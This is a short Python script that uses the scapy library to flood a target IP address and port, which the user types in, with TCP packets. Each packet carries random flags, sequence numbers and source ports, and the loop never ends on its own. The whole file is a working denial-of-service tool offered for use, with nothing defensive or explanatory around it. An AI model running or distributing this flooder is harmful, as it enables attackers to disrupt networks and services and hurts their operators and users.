from scapy.all import *
import random

# By 0x00

def MULTIFlood(HOST, PORT):
    try:
        FLAGS = ['F', 'S', 'R', 'P', 'A', 'U', 'E', 'C']
        while True:
            FLAG = random.choice(FLAGS)
            send(IP(dst=HOST)/TCP(dport=PORT,flags=FLAG,seq=RandShort(),ack=RandShort(),sport=RandShort()))
    except Exception as IE:
        print(IE)
        exit()
    except KeyboardInterrupt:
        print('Exiting, goodbye!')
        exit()

HOST = input('Enter IP ~> ')
PORT = int(input('Enter Port ~> '))
MULTIFlood(HOST, PORT)